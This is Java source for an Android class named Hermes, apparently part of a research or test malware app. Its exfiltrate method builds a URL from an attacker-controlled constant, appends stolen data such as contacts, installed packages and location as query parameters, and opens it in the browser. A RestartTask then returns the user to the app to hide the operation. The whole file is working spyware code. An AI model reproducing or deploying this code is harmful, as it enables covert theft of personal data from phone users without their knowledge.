package com.trustme.testsu;

import java.util.Map;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import com.trustme.testsu.MainActivity;
import com.trustme.testsu.utils.Constants;

public class Hermes{
	public static final String TAG = "Hermes";
	private WiFiTracker wifiTracker = new WiFiTracker();
	
	public Hermes(){
		
	}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	* 
	* This function will attempt to send the data to the url
	* 	using the browser
	* Tip: Make different exfiltrate function to exfiltrate COntacts and installed packages and location
	* Tip: Pass arguments to exfiltrate as key,value pairs (map) - easier to construct the URL
	* @author sdemetr2
	* @param data a Map<String, String> of key-value pairs representing the data to be transfered
	* @param id A unique ID that the server uses to acknowledge this transaction
	* 
	*/
	public void exfiltrate(Map<String, String> data, String id) {
		// TODO Auto-generated method stub
		String url = Constants.ATTACKER_URL;
		
		if (wifiTracker.read_arp()){
			
			((Activity) MainActivity.ctx).runOnUiThread(new Runnable(){
				public void run(){
					try {
						RestartTask restartTask = new RestartTask();
						restartTask.execute();
					}
					catch (Exception e) {
						Log.d(TAG, "Exfiltrate Exploded when trying to start background task: " + e.getMessage());
					}
				}
			});
			
			//construct url?key=value&key=value...
			url += "?id=" + id;
			//Log.i(TAG, "Constructed URL: " + url);
			if (data != null){
				for (String key : data.keySet()){
					url += "&" + key + "=" + data.get(key);
				}
				Log.i(TAG, "Constructed URL: " + url);
			}
			Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
			MainActivity.ctx.startActivity(myIntent);
		}
		else {
			//no internet
			//save data to db
			//start BackgroundService
			Log.i(TAG, "exfiltrate: NO INTERNET");
		}
	}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/**
	* 
	* A background task that starts an Activity which will Restart the main Activity
	* Useful for hiding an operation that was triggered by the main activity  
	* @author sdemetr2
	*/
	public class RestartTask extends AsyncTask<Void, Void, Void>{
		protected RestartTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(80);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("MyPlugin", "RestartTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			
			// Start the RestartActivity in a new task. This will snap the phone out of the built-in dialer app, which
			// has started in it's own task at this point in time. The RestartActivity gains control and finishes
			// immediately, leading control back to the activity at the top of the stack in the
			// app (where the user came from when making the call).
			//Log.i("RestartTask", "RestartTask: postExecute");
			Intent restartIntent = new Intent(MyApplication.getAppContext(), RestartActivity.class);
			restartIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			MyApplication.getAppContext().startActivity(restartIntent);
		}
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

}
